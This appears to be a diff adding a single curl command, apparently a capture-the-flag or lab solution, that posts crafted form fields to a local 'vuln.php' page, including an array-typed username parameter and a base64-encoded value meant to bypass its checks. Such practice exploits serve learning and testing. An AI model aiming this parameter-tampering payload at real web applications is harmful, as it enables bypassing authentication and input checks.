@@ -1,0 +1,10 @@
+curl -X POST "http://localhost/vuln.php?var=1&flag_var=1" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "User-Agent: Mozilla/5.0" \
+  -d "username[]=" \   
+  -d "password=password123" \
+  -d "check=1" \
+  -d "desc=secure_description" \
+  -d "encoded=$(echo -n 'solveIT' | base64)" \
+  -d "var=1" \
+  -d "flag_var=1"
